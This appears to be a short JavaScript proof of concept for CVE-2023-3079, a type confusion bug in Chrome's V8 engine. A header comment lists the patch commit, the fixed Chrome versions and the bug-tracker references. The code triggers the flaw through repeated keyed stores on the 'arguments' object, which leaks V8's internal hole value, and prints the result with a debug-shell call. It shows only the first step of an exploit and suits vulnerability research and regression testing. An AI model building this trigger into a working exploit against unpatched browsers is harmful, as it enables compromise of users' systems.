/* 

Patch commit -> e144f3b
             -> https://github.com/v8/v8/commit/e144f3b 
             -> https://chromium-review.googlesource.com/c/v8/v8/+/4584248
             -> patched in v114.0.5735.106-110

Reference(s):
                            -> https://crbug.com/1450481
                            -> https://nvd.nist.gov/vuln/detail/CVE-2023-3079
                            -> @alisaesage
                            -> @mistymntncop
                            -> @MaxBWMinRTT
*/

function set(arr, key, val) {
    arr[key] = val;
}
function leak_hole() {
    for(let i = 0; i < 10; i++) {
        set(arguments, "foo", 1);
    }
    set([], 0, 1);
    set(arguments, 0, 1);
    return arguments[1];
}
%DebugPrint(leak_hole());
